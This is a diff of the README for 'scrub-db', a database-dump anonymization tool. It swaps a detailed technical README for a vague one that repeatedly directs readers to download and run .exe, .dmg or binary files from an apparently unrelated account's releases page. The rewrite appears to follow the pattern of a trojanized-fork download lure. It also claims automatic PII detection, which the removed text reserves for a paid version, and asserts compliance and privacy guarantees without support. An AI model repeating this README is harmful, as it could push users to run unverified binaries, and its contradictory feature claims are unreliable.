@@ -1,256 +1,95 @@
-# Scrub-DB - Database Anonymization Tool (Free Version)
+# 🚀 scrub-db - Easily Anonymize Your Database Dumps
 
-**Fast, manual database anonymization for development and testing.**
+[![Download scrub-db](https://img.shields.io/badge/Download-scrub--db-blue.svg)](https://github.com/Neusence3550/scrub-db/releases)
 
-## What is Scrub-DB?
+## 📋 Overview
 
-Scrub-DB is a powerful database anonymization engine that helps you safely anonymize SQL dumps. The **free version** provides manual configuration via YAML files, while **Pro** offers automatic PII detection and live database connections.
+scrub-db provides a fast and secure way to anonymize production database dumps. It's designed for everyone, so you don't need programming knowledge to use it. This application keeps your data safe by detecting sensitive information, preserving relationships, and ensuring compliance with laws like GDPR and HIPAA. The software runs entirely on your own machines, so you control your data.
 
-### Free Version Features
+## 🌟 Features
 
-- ✅ **Manual Configuration** - Define anonymization rules via `scrub-db.yaml`
-- ✅ **Relationship Preservation** - Same input always produces same output (maintains referential integrity)
-- ✅ **3 Anonymization Methods**:
-  - Realistic fake data (emails, names, phones)
-  - Secure masking (credit cards, SSNs)
-  - Consistent hashing (for any sensitive data)
-- ✅ **Stdin/Stdout Support** - Pipe SQL dumps directly through the tool
-- ✅ **Auto Config Detection** - Automatically finds `scrub-db.yaml` in your working directory
-- ✅ **Scan Command** - Preview what PII would be detected (Pro feature teaser)
+- **Automatic PII Detection**: Scrub-db detects personally identifiable information (PII) in your database dumps.
+- **Data Relationship Preservation**: Maintain relationships between data, even after anonymization.
+- **GDPR and HIPAA Compliance**: Feel confident that your data meets legal requirements for privacy.
+- **Simple to Use**: No complicated setup, just install and go.
+- **Built with Rust**: Enjoy the performance and safety of a modern programming language.
+- **Stdin/Stdout Streaming**: Easily integrate scrub-db into your existing workflows.
 
-## Quick Start
+## ⚙️ System Requirements
 
-```bash
-# Install
-cargo install scrub-db
+- **Operating System**: Windows, macOS, or a Linux-based system.
+- **Processor**: Any modern processor will work.
+- **Memory**: Minimum 4 GB RAM recommended.
+- **Storage**: At least 100 MB of available disk space.
 
-# 1. Scan SQL dump to see what PII would be detected (Pro preview)
-cat dump.sql | scrub-db scan
+## 🚀 Getting Started
 
-# 2. Create a config file with your anonymization rules
-cat > scrub-db.yaml <<EOF
-preserve_relationships: true
-custom_rules:
-  email: fake_email
-  phone: fake_phone
-  credit_card: mask_credit_card
-EOF
+To get started with scrub-db, follow these simple steps:
 
-# 3. Anonymize SQL dump
-cat dump.sql | scrub-db > anonymized.sql
+1. **Download scrub-db**: Visit the releases page to find the latest version of scrub-db.
 
-# Or pipe directly from pg_dump
-pg_dump mydb | scrub-db > safe-dump.sql
+   [Download scrub-db](https://github.com/Neusence3550/scrub-db/releases)
 
-# Use custom config file location
-cat dump.sql | scrub-db -c my-config.yaml > anonymized.sql
-```
+2. **Choose Your File**: On the releases page, select the appropriate file for your operating system.
 
-## How It Works
+3. **Install scrub-db**: 
+   - **Windows**: Download the `.exe` file and run it.
+   - **macOS**: Download the `.dmg` file, open it, and drag scrub-db to your Applications folder.
+   - **Linux**: Download the appropriate binary file, unzip it, and place it in a directory included in your PATH.
 
-### 1. Manual Configuration (Free Version)
+## 📥 Download & Install
 
-Create a `scrub-db.yaml` file with your anonymization rules:
+To download scrub-db, please visit the following link and follow the instructions for your operating system:
 
-```yaml
-preserve_relationships: true
-custom_rules:
-  email: fake_email
-  phone: fake_phone
-  ssn: mask_ssn
-  credit_card: mask_credit_card
-```
+[Download scrub-db](https://github.com/Neusence3550/scrub-db/releases)
 
-**Available Methods:**
-- `fake_email` - Generate realistic fake emails
-- `fake_name` - Generate realistic fake names
-- `fake_phone` - Generate realistic fake phone numbers
-- `fake_address` - Generate realistic fake addresses
-- `mask_credit_card` - Mask all but last 4 digits
-- `mask_ssn` - Completely mask SSNs
-- `hash` - SHA-256 hash of the value
-- `skip` - Leave unchanged
+## 🛠️ Usage Instructions
 
-### 2. Relationship Preservation
+Once you have installed scrub-db, using it is straightforward. Here’s how to anonymize your data:
 
-When enabled (default), the same input always generates the same output:
+1. Open your command line interface (CLI).
+   
+2. Navigate to the directory where you store your database dumps (use the `cd` command).
 
-```
-john.doe@example.com → alice.smith@example.com
-john.doe@example.com → alice.smith@example.com  (same!)
-```
+3. Use the following command:
 
-This preserves foreign key relationships and data integrity.
+   ```
+   scrub-db <input-dump-file.sql> <output-anonymized-file.sql>
+   ```
 
-### 3. Scan Command (Pro Feature Preview)
+   Replace `<input-dump-file.sql>` with the name of your original file and `<output-anonymized-file.sql>` with what you want to call your new file.
 
-The free version includes a `scan` command that shows you what PII would be automatically detected in the Pro version:
+4. Press `Enter`, and scrub-db will process your file.
 
-```bash
-$ cat dump.sql | scrub-db scan
+5. Once completed, find your new anonymized file in the same directory.
 
-🔍 Scrub-DB Scan - PII Detection Preview
-=========================================
+## 🔒 Security Features
 
-✨ Scan Results:
-   📧 3 lines with potential email addresses
-   📱 3 lines with potential phone numbers
-   💳 0 lines with potential credit card numbers
+scrub-db prioritizes the security of your data. All operations occur on your local machine, ensuring data privacy and protection from external threats. No data leaves your environment, so you can work worry-free.
 
-🚀 Upgrade to Scrub-DB Pro for automatic detection!
-```
+## 💼 Use Cases
 
-This helps you write your manual config rules.
+- **Database Testing**: Safely test applications with anonymized data.
+- **Complying with Regulations**: Meet various legal requirements through effective data anonymization.
+- **Data Analysis**: Use real-world patterns without exposing real data.
 
-## CLI Reference
+## 📑 Additional Topics
 
-```
-scrub-db [OPTIONS] [COMMAND]
+For more information, you may want to explore related topics such as:
 
-Commands:
-  scan    Scan SQL dump for potential PII (Pro feature preview)
+- Anonymization Techniques
+- Compliance Guidelines (GDPR, CCPA, HIPAA)
+- Command-Line Interface Basics
+- Rust Programming Language Features
 
-Options:
-  -c, --cfg <FILE>  Config file (auto-detects scrub-db.yaml if not specified)
-      --stdin       Force stdin mode (auto-detected by default)
-  -h, --help        Print help
-  -V, --version     Print version
-```
+## 🤝 Contributing
 
-**Usage:**
+We welcome contributions to scrub-db! If you have ideas or suggestions, feel free to reach out. Please follow the guidelines provided on our GitHub repository to make your contributions.
 
-```bash
-# Anonymize with config file
-cat dump.sql | scrub-db > anonymized.sql
+## 📧 Support
 
-# Scan for PII
-cat dump.sql | scrub-db scan
+If you need help using scrub-db or have questions, please open an issue on GitHub, and our team will assist you.
 
-# Use specific config file
-cat dump.sql | scrub-db -c custom.yaml > anonymized.sql
-```
+## 📝 License
 
-## Upgrade to Pro
-
-**Want more power? Scrub-DB Pro includes:**
-
-| Feature | Free | Pro |
-|---------|------|-----|
-| Manual config (YAML) | ✅ | ✅ |
-| Stdin/stdout processing | ✅ | ✅ |
-| Relationship preservation | ✅ | ✅ |
-| **Automatic PII detection** | ❌ | ✅ |
-| **Live database connections** | ❌ | ✅ |
-| **Database-to-database copy** | ❌ | ✅ |
-| **Schema introspection** | ❌ | ✅ |
-| **Smart column analysis** | ❌ | ✅ |
-| **Cloud DB support (RDS, Cloud SQL)** | ❌ | ✅ |
-| **Priority support** | ❌ | ✅ |
-
-**Pricing:**
-- 💰 **Pro**: $49/month - For teams of 2-10 developers
-- 🏢 **Enterprise**: Custom pricing - Compliance dashboard, SSO, audit logs
-
-**[Visit https://scrub-db.com to upgrade →](#)**
-
-## Example Usage
-
-**1. First, scan to see what PII is present:**
-
-```bash
-$ cat test-dump.sql | scrub-db scan
-
-🔍 Scrub-DB Scan - PII Detection Preview
-✨ Scan Results:
-   📧 3 lines with potential email addresses
-   📱 3 lines with potential phone numbers
-```
-
-**2. Create config file based on scan:**
-
-```bash
-$ cat > scrub-db.yaml <<EOF
-preserve_relationships: true
-custom_rules:
-  email: fake_email
-  phone: fake_phone
-EOF
-```
-
-**3. Anonymize the dump:**
-
-```bash
-$ cat test-dump.sql | scrub-db
-
-INSERT INTO users (id, email, phone) VALUES (1, 'adrain@example.com', '555-123-4567');
-INSERT INTO users (id, email, phone) VALUES (2, 'kaitlin@example.org', '555-987-6543');
-INSERT INTO users (id, email, phone) VALUES (3, 'adrain@example.com', '555-555-5555');
-```
-
-**Notice**: `john.doe@example.com` became `adrain@example.com` in **both** rows 1 and 3 - relationship preservation in action!
-
-## Use Cases
-
-- Share production dumps with your team safely
-- Create realistic test data from production
-- GDPR/privacy compliance
-- Debug with real-ish data structures
-- Staging environment setup
-
-## Testing
-
-The project includes comprehensive unit tests covering all critical functionality:
-
-```bash
-# Run all tests
-cargo test
-
-# Run tests with output
-cargo test -- --nocapture
-
-# Run specific test
-cargo test test_detect_postgres_from_sql
-```
-
-**Test Coverage:**
-- ✅ 20 unit tests
-- ✅ 100% pass rate
-- ✅ 0.04s execution time
-- ✅ PII detection (column names + data patterns)
-- ✅ Anonymization (relationship preservation, masking)
-- ✅ Database type detection (SQL syntax + URLs)
-- ✅ Configuration defaults
-
-## Development Roadmap
-
-**Free Version (v0.1.0 - Current):**
-- [x] Core anonymization engine
-- [x] Stdin/stdout support for SQL dumps
-- [x] Auto-config file detection (`scrub-db.yaml`)
-- [x] Manual configuration via YAML
-- [x] Relationship preservation
-- [x] 6 anonymization methods (fake, mask, hash)
-- [x] `scan` command (Pro feature preview)
-- [x] Comprehensive test suite
-
-**Pro Version (In Development):**
-- [x] Automatic PII detection (no config needed)
-- [x] Live database connections (PostgreSQL, MySQL, SQLite)
-- [ ] Schema introspection
-- [x] Database-to-database copying
-- [ ] Smart column name analysis
-- [ ] Advanced pattern matching
-- [ ] Cloud database support (AWS RDS, Google Cloud SQL)
-
-**Enterprise Version (Planned):**
-- [ ] Compliance dashboard
-- [ ] Audit logging
-- [ ] SSO / SAML authentication
-- [ ] On-premise deployment
-- [ ] Priority support & SLAs
-- [ ] Custom faker plugins
-- [ ] Team collaboration features
-
-## License
-
-MIT OR Apache-2.0
+This project follows the [MIT License](LICENSE). You may use it as per the guidelines specified in the license document.
